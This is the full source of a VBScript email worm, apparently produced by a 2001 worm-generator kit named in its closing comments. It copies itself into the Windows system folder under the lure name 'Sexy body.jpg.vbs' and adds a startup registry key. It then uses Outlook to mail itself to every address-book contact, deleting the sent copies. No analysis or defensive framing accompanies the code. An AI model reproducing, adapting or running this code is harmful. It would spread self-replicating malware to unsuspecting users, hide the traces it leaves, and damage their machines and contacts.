On Error Resume Next
Dim crv1, crv2, crv3, crv4, crv5
Dim vrc1, vrc2
Set vrc1 = CreateObject( "Scripting.FileSystemObject" )
vrc1.CopyFile WScript.ScriptFullName, vrc1.BuildPath( vrc1.GetSpecialFolder(1), "Sexy body.jpg.vbs")
Set vrc2 = CreateObject( "WScript.Shell" )
vrc2.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\" & "pippo", vrc1.BuildPath( vrc1.GetSpecialFolder(1), "Sexy body.jpg.vbs")
Set crv1 = CreateObject( "Outlook.Application" )
Set crv2 = crv1.GetNameSpace( "MAPI" )
For Each crv3 In crv2.AddressLists
For crv4 = 1 To crv3.AddressEntries.Count
Set crv5 = crv1.CreateItem( 0 )
crv5.BCC = crv3.AddressEntries( crv4 ).Address
crv5.Subject = "Hello man..."
crv5.Body = "test"
crv5.Attachments.Add WScript.ScriptFullName
crv5.DeleteAfterSubmit = True
crv5.Send
Next
Next
'test1
'Author name is: test1
'This worm is created by Little Boy VBS-Worm Generator/2001/ Acidcookie / www.vxbiolabs.cjb.net
